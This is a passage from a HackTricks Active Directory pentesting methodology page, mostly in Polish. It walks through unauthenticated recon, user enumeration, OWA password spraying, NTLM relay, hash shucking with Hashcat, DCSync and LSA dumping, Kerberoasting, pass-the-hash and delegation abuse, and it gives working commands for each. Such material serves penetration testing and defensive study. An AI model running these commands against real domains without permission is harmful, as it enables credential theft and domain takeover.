# Metodologia Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Podstawowy przegląd

**Active Directory** jest technologią bazową, która umożliwia **administratorom sieci** efektywne tworzenie i zarządzanie **domenami**, **użytkownikami** i **obiektami** w obrębie sieci. Została zaprojektowana z myślą o skalowalności, pozwalając na organizację dużej liczby użytkowników w zarządzalne **grupy** i **podgrupy**, przy jednoczesnej kontroli **praw dostępu** na różnych poziomach.

Struktura **Active Directory** składa się z trzech podstawowych warstw: **domains**, **trees** i **forests**. **Domain** obejmuje zbiór obiektów, takich jak **użytkownicy** czy **urządzenia**, które dzielą wspólną bazę danych. **Trees** to grupy tych domen połączone wspólną strukturą, a **forest** to zbiór wielu drzew powiązanych przez **trust relationships**, tworzący najwyższy poziom struktury organizacyjnej. Na każdym z tych poziomów można określać konkretne **prawa dostępu** i **prawa komunikacji**.

Kluczowe pojęcia w **Active Directory** obejmują:

1. **Directory** – Przechowuje wszystkie informacje dotyczące obiektów Active Directory.
2. **Object** – Oznacza jednostki w katalogu, w tym **użytkowników**, **grupy** lub **udostępnione foldery**.
3. **Domain** – Służy jako kontener dla obiektów katalogu; w **forest** może istnieć wiele domen, z których każda ma własny zbiór obiektów.
4. **Tree** – Grupa domen, które dzielą wspólną domenę nadrzędną.
5. **Forest** – Najwyższy poziom struktury w Active Directory, składający się z kilku drzew z **trust relationships** między nimi.

**Active Directory Domain Services (AD DS)** obejmuje szereg usług istotnych dla scentralizowanego zarządzania i komunikacji w sieci. Usługi te obejmują:

1. **Domain Services** – Centralizuje przechowywanie danych i zarządza interakcjami między **użytkownikami** a **domenami**, w tym funkcjami **authentication** i **search**.
2. **Certificate Services** – Zarządza tworzeniem, dystrybucją i obsługą bezpiecznych **digital certificates**.
3. **Lightweight Directory Services** – Wspiera aplikacje korzystające z katalogu poprzez protokół **LDAP**.
4. **Directory Federation Services** – Zapewnia funkcje **single-sign-on** do uwierzytelniania użytkowników w wielu aplikacjach webowych w jednej sesji.
5. **Rights Management** – Pomaga chronić materiały objęte prawami autorskimi, kontrolując ich nieautoryzowane rozpowszechnianie i użycie.
6. **DNS Service** – Kluczowa dla rozwiązywania nazw domenowych (**domain names**).

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Jeżeli masz dostęp do środowiska AD, ale nie posiadasz poświadczeń/sesji, możesz:

- **Pentest the network:**
- Skanuj sieć, znajdź maszyny i otwarte porty i spróbuj **exploit vulnerabilities** lub **extract credentials** z nich (na przykład, [printers could be very interesting targets](ad-information-in-printers.md)).
- Enumeracja DNS może dostarczyć informacji o kluczowych serwerach w domenie, takich jak web, printers, shares, vpn, media itp.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Zobacz ogólną [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md), aby uzyskać więcej informacji o tym, jak to robić.
- **Check for null and Guest access on smb services** (to nie zadziała na nowoczesnych wersjach Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Bardziej szczegółowy przewodnik dotyczący enumeracji SMB można znaleźć tutaj:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Bardziej szczegółowy przewodnik dotyczący enumeracji LDAP można znaleźć tutaj (zwróć **szczególną uwagę na anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Zbieraj poświadczenia, **impersonating services with Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Uzyskaj dostęp do hosta poprzez [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Zbieraj poświadczenia, **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Wyciągaj nazwy użytkowników/imiona z wewnętrznych dokumentów, social media, usług (głównie web) w środowiskach domeny oraz z publicznie dostępnych źródeł.
- Jeśli znajdziesz pełne imiona pracowników firmy, możesz spróbować różnych konwencji nazw użytkowników AD (**read this**). Najczęstsze konwencje to: _NameSurname_, _Name.Surname_, _NamSur_ (3 litery z każdego), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Narzędzia:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Sprawdź strony [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) oraz [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Gdy żądany jest **invalid username**, serwer odpowie używając **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, co pozwala ustalić, że nazwa użytkownika jest nieprawidłowa. **Valid usernames** spowodują otrzymanie albo **TGT in a AS-REP** response, albo błędu _KRB5KDC_ERR_PREAUTH_REQUIRED_, wskazującego, że użytkownik musi wykonać pre-authentication.
- **No Authentication against MS-NRPC**: Użycie auth-level = 1 (No authentication) przeciwko interfejsowi MS-NRPC (Netlogon) na domain controllerach. Metoda wywołuje funkcję `DsrGetDcNameEx2` po zbindowaniu interfejsu MS-NRPC, aby sprawdzić, czy użytkownik lub komputer istnieje bez żadnych poświadczeń. Narzędzie [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementuje ten typ enumeracji. Badania można znaleźć [tutaj](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Serwer OWA (Outlook Web Access)**

Jeśli znajdziesz taki serwer w sieci, możesz również przeprowadzić **user enumeration** na nim. Na przykład, możesz użyć narzędzia [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Możesz znaleźć listy nazw użytkowników w [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  i w tym ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Jednak powinieneś mieć **imiona i nazwiska osób pracujących w firmie** z etapu recon, który powinieneś wykonać wcześniej. Mając imię i nazwisko możesz użyć skryptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) do wygenerowania potencjalnych poprawnych nazw użytkowników.

### Znając jedną lub kilka nazw użytkowników

Ok, więc wiesz, że masz już poprawną nazwę użytkownika, ale nie masz haseł... Spróbuj wtedy:

- [**ASREPRoast**](asreproast.md): Jeśli użytkownik **nie ma** atrybutu _DONT_REQ_PREAUTH_ możesz **zażądać komunikatu AS_REP** dla tego użytkownika, który będzie zawierać dane zaszyfrowane pochodną hasła użytkownika.
- [**Password Spraying**](password-spraying.md): Spróbuj najbardziej **common passwords** dla każdego z odnalezionych użytkowników — może któryś używa słabego hasła (pamiętaj o polityce haseł!).
- Zwróć uwagę, że możesz także **spray OWA servers** aby spróbować uzyskać dostęp do serwerów pocztowych użytkowników.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Możesz być w stanie uzyskać pewne challenge **hashes**, które można złamać, poprzez **poisoning** niektórych protokołów w sieci:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Jeśli udało Ci się zenumerować active directory, będziesz mieć **więcej adresów e-mail i lepsze zrozumienie sieci**. Możesz być w stanie wymusić NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) aby uzyskać dostęp do środowiska AD.

### NetExec workspace-driven recon & relay posture checks

- Używaj **`nxcdb` workspaces** do przechowywania stanu recon AD dla każdego zaangażowania: `workspace create <name>` tworzy bazy SQLite per-protocol pod `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Przełączaj widoki poleceniem `proto smb|mssql|winrm` i wyświetl zebrane sekrety poleceniem `creds`. Ręcznie usuń wrażliwe dane po zakończeniu: `rm -rf ~/.nxc/workspaces/<name>`.
- Szybkie wykrywanie podsieci za pomocą **`netexec smb <cidr>`** ujawnia **domain**, **OS build**, **SMB signing requirements**, i **Null Auth**. Hosty pokazujące `(signing:False)` są **relay-prone**, podczas gdy DC często wymagają podpisywania.
- Wygeneruj **hostnames in /etc/hosts** bezpośrednio z wyjścia NetExec, aby ułatwić targetowanie:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Gdy **SMB relay to the DC is blocked** by signing, wciąż sprawdzaj postawę **LDAP**: `netexec ldap <dc>` pokazuje `(signing:None)` / weak channel binding. DC z wymaganym SMB signing, ale wyłączonym LDAP signing, pozostaje możliwym celem **relay-to-LDAP** do nadużyć takich jak **SPN-less RBCD**.

### Client-side printer credential leaks → masowa walidacja poświadczeń domeny

- Interfejsy printer/web czasami **osadzają zamaskowane hasła administratora w HTML**. Podgląd źródła/devtools może ujawnić tekst jawny (np. `<input value="<password>">`), umożliwiając dostęp Basic-auth do repozytoriów skanów/druków.
- Pobrane zadania drukowania mogą zawierać **dokumenty onboardingowe w formie jawnego tekstu** z hasłami dla poszczególnych użytkowników. Utrzymuj zgodność par podczas testów:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Kradzież NTLM Creds

Jeśli możesz **uzyskać dostęp do innych komputerów lub udziałów** przy użyciu **konta null lub guest**, możesz **umieścić pliki** (np. SCF file), które po otwarciu spowodują **wywołanie uwierzytelnienia NTLM przeciwko Tobie**, dzięki czemu możesz **ukraść** **NTLM challenge** i złamać go:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** traktuje każdy NT hash, który już posiadasz, jako kandydat na hasło dla innych, wolniejszych formatów, których materiał klucza jest bezpośrednio wyprowadzany z NT hash. Zamiast brute-force’ować długie hasła w Kerberos RC4 tickets, NetNTLM challenges czy cached credentials, podajesz NT hashe do trybów NT-candidate w Hashcat i pozwalasz mu sprawdzić ponowne użycie haseł bez poznawania plaintextu. Jest to szczególnie skuteczne po kompromitacji domeny, gdy możesz zebrać tysiące aktualnych i historycznych NT hashy.

Używaj shuckingu gdy:

- Masz korpus NT z DCSync, zrzutów SAM/SECURITY lub credential vaults i musisz sprawdzić ponowne użycie w innych domenach/lasach.
- Udało Ci się przechwycić materiał Kerberos oparty na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), odpowiedzi NetNTLM lub bloby DCC/DCC2.
- Chcesz szybko udowodnić ponowne użycie dla długich, trudnych do złamania passphrase’ów i natychmiast pivotować przez Pass-the-Hash.

Technika **nie działa** przeciwko typom szyfrowania, których klucze nie są pochodne od NT hash (np. Kerberos etype 17/18 AES). Jeśli domena wymusza tylko AES, musisz wrócić do zwykłych trybów hasła.

#### Budowanie korpusu NT hashy

- **DCSync/NTDS** – Użyj `secretsdump.py` z historią, aby zgarnąć jak największy zestaw NT hashy (i ich poprzednich wartości):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Wpisy historyczne znacząco poszerzają pulę kandydatów, ponieważ Microsoft może przechowywać do 24 poprzednich hashy na konto. Więcej sposobów na zebranie sekretów NTDS znajdziesz w:

{{#ref}}
dcsync.md
{{#endref}}

- **Zrzuty cache endpointów** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (lub Mimikatz `lsadump::sam /patch`) wyciąga lokalne SAM/SECURITY oraz cached domain logons (DCC/DCC2). Dedupikuj i dopisz te hashy do tego samego pliku `nt_candidates.txt`.
- **Śledź metadane** – Zachowaj nazwę użytkownika/domenę, która wygenerowała każdy hash (nawet jeśli wordlist zawiera tylko hex). Dopasowanie hashy od razu mówi, który principal ponownie używa hasła, gdy Hashcat wypisze zwycięski kandydat.
- Preferuj kandydatów z tego samego forestu lub z zaufanego forestu; to maksymalizuje szansę na pokrycie przy shuckingu.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Uwagi:

- Wejścia NT-candidate **muszą pozostać surowymi 32-hex NT hashami**. Wyłącz silniki reguł (bez `-r`, bez trybów hybrydowych), ponieważ mangling uszkadza materiał klucza kandydata.
- Te tryby nie są z natury szybsze, ale przestrzeń kluczy NTLM (~30,000 MH/s na M3 Max) jest ~100× szybsza niż Kerberos RC4 (~300 MH/s). Testowanie skuratorowanej listy NT jest dużo tańsze niż eksploracja całego przestrzeni haseł w wolnym formacie.
- Zawsze uruchamiaj **najnowszy build Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), ponieważ tryby 31500/31600/35300/35400 pojawiły się niedawno.
- Aktualnie nie ma trybu NT dla AS-REQ Pre-Auth, a etypy AES (19600/19700) wymagają plaintextowego hasła, ponieważ ich klucze są wyprowadzane przez PBKDF2 z UTF-16LE haseł, a nie z surowych NT hashy.

#### Przykład – Kerberoast RC4 (mode 35300)

1. Przechwyć RC4 TGS dla docelowego SPN używając niskoprzywilejowego użytkownika (szczegóły na stronie Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuckuj ticket za pomocą swojej listy NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat wyprowadza klucz RC4 z każdego NT kandydata i waliduje blob `$krb5tgs$23$...`. Dopasowanie potwierdza, że konto serwisowe używa jednego z posiadanych NT hashy.

3. Natychmiast pivotuj przez PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcjonalnie możesz później odzyskać plaintext przy `hashcat -m 1000 <matched_hash> wordlists/`, jeśli zajdzie taka potrzeba.

#### Przykład – Cached credentials (mode 31600)

1. Zrzutuj cached logons z przejętej stacji roboczej:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Skopiuj linię DCC2 dla interesującego użytkownika domenowego do `dcc2_highpriv.txt` i shuckuj ją:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Pomyślne dopasowanie daje NT hash już znany z twojej listy, co udowadnia, że cached user ponownie używa tego samego hasła. Użyj go bezpośrednio do PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) albo brute-force’uj go w szybkim trybie NTLM, aby odzyskać ciąg.

Ten sam workflow dotyczy NetNTLM challenge-response (`-m 27000/27100`) oraz DCC (`-m 31500`). Po zidentyfikowaniu dopasowania możesz uruchomić relay, SMB/WMI/WinRM PtH, lub ponownie złamać NT hash offline przy użyciu masek/reguł.

## Enumerating Active Directory WITH credentials/session

W tej fazie musisz mieć **skompro‑mitowane poświadczenia lub sesję ważnego konta domenowego.** Jeśli masz jakieś ważne poświadczenia lub shell jako użytkownik domenowy, **pamiętaj, że wcześniej wymienione opcje dalej pozostają sposobami na kompromitację innych użytkowników.**

Zanim zaczniesz uwierzytelnioną enumerację, powinieneś znać problem **Kerberos double hop.**

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Kompromitacja konta to **duży krok do kompromitacji całej domeny**, ponieważ umożliwia rozpoczęcie **Active Directory Enumeration:**

Jeśli chodzi o [**ASREPRoast**](asreproast.md) możesz teraz znaleźć wszystkich potencjalnie podatnych użytkowników, a jeśli chodzi o [**Password Spraying**](password-spraying.md) możesz zebrać **listę wszystkich nazw użytkowników** i spróbować hasła skompromitowanego konta, pustych haseł oraz nowych obiecujących haseł.

- Możesz użyć [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Możesz też użyć [**powershell for recon**](../basic-powershell-for-pentesters/index.html), co będzie bardziej stealthy
- Możesz również [**use powerview**](../basic-powershell-for-pentesters/powerview.md) aby wyciągnąć bardziej szczegółowe informacje
- Kolejnym świetnym narzędziem do reconu w Active Directory jest [**BloodHound**](bloodhound.md). Nie jest ono **bardzo stealthy** (zależy od metod zbierania), ale **jeśli ci to nie przeszkadza**, warto spróbować. Znajdź gdzie użytkownicy mogą RDP, ścieżki do innych grup, itp.
- **Inne zautomatyzowane narzędzia do enumeracji AD to:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) — mogą zawierać interesujące informacje.
- Narzędziem z GUI do przeglądania katalogu jest **AdExplorer.exe** z pakietu **SysInternal**.
- Możesz także przeszukać bazę LDAP za pomocą **ldapsearch**, aby szukać poświadczeń w polach _userPassword_ & _unixUserPassword_, a nawet w _Description_. Zobacz [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) dla innych metod.
- Jeśli używasz **Linux**, możesz też enumerować domenę używając [**pywerview**](https://github.com/the-useless-one/pywerview).
- Możesz też wypróbować zautomatyzowane narzędzia:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Wyciąganie wszystkich użytkowników domeny**

Bardzo łatwo jest uzyskać wszystkie nazwy użytkowników domeny z Windows (`net user /domain`, `Get-DomainUser` lub `wmic useraccount get name,sid`). W Linuxie możesz użyć: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` lub `enum4linux -a -u "user" -p "password" <DC IP>`

> Nawet jeśli sekcja Enumeration wygląda na krótką, to jest to najważniejsza część całego procesu. Odwiedź linki (głównie te dotyczące cmd, powershell, powerview i BloodHound), naucz się jak enumerować domenę i ćwicz aż poczujesz się pewnie. Podczas testu będzie to kluczowy moment, aby znaleźć drogę do DA lub stwierdzić, że nic nie da się zrobić.

### Kerberoast

Kerberoasting polega na pozyskaniu **TGS tickets** używanych przez usługi powiązane z kontami użytkowników i łamaniu ich szyfrowania—które opiera się na hasłach użytkowników—**offline**.

Więcej na ten temat:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Gdy zdobędziesz jakieś poświadczenia, możesz sprawdzić, czy masz dostęp do jakiejkolwiek **maszyny**. W tym celu możesz użyć **CrackMapExec**, aby próbować łączyć się z wieloma serwerami przy użyciu różnych protokołów zgodnie z wynikami skanu portów.

### Local Privilege Escalation

Jeśli przejąłeś poświadczenia lub sesję jako zwykły użytkownik domenowy i masz **dostęp** tym użytkownikiem do **dowolnej maszyny w domenie**, powinieneś spróbować eskalacji uprawnień lokalnie i poszukać poświadczeń. Tylko z uprawnieniami lokalnego administratora będziesz w stanie **zrzucać hashe innych użytkowników** z pamięci (LSASS) i lokalnie (SAM).

W tej książce jest osobna strona o [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) oraz [**checklista**](../checklist-windows-privilege-escalation.md). Nie zapomnij też użyć [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Jest bardzo **mało prawdopodobne**, że znajdziesz **ticket’y** w bieżącym użytkowniku, które dadzą Ci uprawnienia do niespodziewanych zasobów, ale możesz sprawdzić:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Szukanie Creds w udostępnieniach komputerów | SMB Shares

Teraz, gdy masz podstawowe credentials, powinieneś sprawdzić, czy możesz **znaleźć** jakiekolwiek **interesujące pliki udostępnione w AD**. Możesz to zrobić ręcznie, ale to bardzo nudne i powtarzalne zadanie (a jeszcze gorzej, jeśli znajdziesz setki dokumentów do sprawdzenia).

[**Kliknij ten link, aby dowiedzieć się o narzędziach, których możesz użyć.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Jeśli możesz **dostać się do innych komputerów lub udostępnień**, możesz **umieścić pliki** (np. plik SCF), które, jeśli w jakiś sposób zostaną otwarte, **wywołają NTLM uwierzytelnienie przeciwko tobie**, dzięki czemu możesz **ukraść** **NTLM challenge**, aby go złamać:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Do poniższych technik zwykły użytkownik domeny nie wystarczy, potrzebujesz specjalnych uprawnień/credentials, aby wykonać te ataki.**

### Hash extraction

Miejmy nadzieję, udało ci się **skompromitować jakieś konto lokalnego administratora** przy użyciu [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) włącznie z relayingiem, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Następnie czas zrzucić wszystkie hashe z pamięci i lokalnie.\
[**Przeczytaj tę stronę o różnych sposobach pozyskania hashy.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
Musisz użyć jakiegoś **narzędzia**, które **wykona** **NTLM authentication używając** tego **hasha**, **lub** możesz utworzyć nowe **sessionlogon** i **wstrzyknąć** ten **hash** do **LSASS**, tak aby przy każdym **NTLM authentication** ten **hash był używany.** Ostatnia opcja to to, co robi mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrator** you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Zwróć uwagę, że to jest dość **hałaśliwe** i **LAPS** by to **ograniczył**.

### MSSQL Abuse & Trusted Links

Jeśli użytkownik ma uprawnienia do **dostępu do instancji MSSQL**, może wykorzystać je do **wykonywania poleceń** na hoście MSSQL (jeśli działa jako SA), **ukraść** NetNTLM **hash** lub nawet przeprowadzić **relay attack**.\
Ponadto, jeśli instancja MSSQL jest zaufana (database link) przez inną instancję MSSQL, a użytkownik ma uprawnienia do zaufanej bazy danych, będzie mógł **wykorzystać relację zaufania do wykonywania zapytań także w tej innej instancji**. Te zaufania mogą być łańcuchowe i w pewnym momencie użytkownik może znaleźć źle skonfigurowaną bazę danych, gdzie będzie mógł wykonywać polecenia.\
**Połączenia między bazami działają nawet w ramach forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Narzędzia firm trzecich do inwentaryzacji i wdrażania często ujawniają potężne ścieżki do poświadczeń i wykonania kodu. Zobacz:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Jeśli znajdziesz dowolny obiekt Computer z atrybutem [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i masz uprawnienia domenowe na tym komputerze, będziesz w stanie zrzucić TGT z pamięci wszystkich użytkowników, którzy logują się na tym komputerze.\\
Więc jeśli **Domain Admin** zaloguje się na tym komputerze, będziesz mógł zrzucić jego TGT i podszyć się pod niego używając [Pass the Ticket](pass-the-ticket.md).\
Dzięki constrained delegation możesz nawet **automatycznie przejąć Print Server** (oby to był DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Jeśli użytkownik lub komputer ma przydzielone uprawnienia do "Constrained Delegation", będzie mógł **podszyć się pod dowolnego użytkownika, aby uzyskać dostęp do niektórych usług na komputerze**.\
Następnie, jeśli **skompromisujesz hash** tego użytkownika/komputera, będziesz w stanie **podszyć się pod dowolnego użytkownika** (nawet domain admins) aby uzyskać dostęp do niektórych usług.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Posiadanie uprawnienia **WRITE** do obiektu Active Directory zdalnego komputera umożliwia osiągnięcie wykonania kodu z **podwyższonymi uprawnieniami**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Zkompromitowany użytkownik może mieć pewne **interesujące uprawnienia względem niektórych obiektów domeny**, które mogą pozwolić ci **przemieszczać się lateralnie / eskalować uprawnienia**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Wykrycie nasłuchującej usługi **Spool** w domenie może być **nadużyte** do **pozyskania nowych poświadczeń** i **eskalacji uprawnień**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Jeśli **inni użytkownicy** **uzyskują dostęp** do **skompromitowanej** maszyny, możliwe jest **zbieranie poświadczeń z pamięci** i nawet **wstrzykiwanie beacons w ich procesy**, by się pod nich podszyć.\
Zazwyczaj użytkownicy łączą się przez RDP, więc poniżej masz kilka ataków na sesje RDP stron trzecich:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

